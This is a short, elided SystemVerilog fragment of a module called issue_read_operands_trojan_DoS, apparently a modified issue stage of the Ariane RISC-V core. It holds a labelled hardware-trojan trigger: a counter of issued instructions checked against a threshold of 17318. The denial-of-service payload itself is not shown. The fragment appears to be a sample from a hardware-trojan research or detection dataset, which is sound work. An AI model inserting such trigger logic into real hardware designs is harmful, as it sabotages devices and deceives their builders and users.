...
module issue_read_operands_trojan_DoS
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=17318)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17318;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (issue_instr_valid_i) trojan_counter <= trojan_counter + 1;
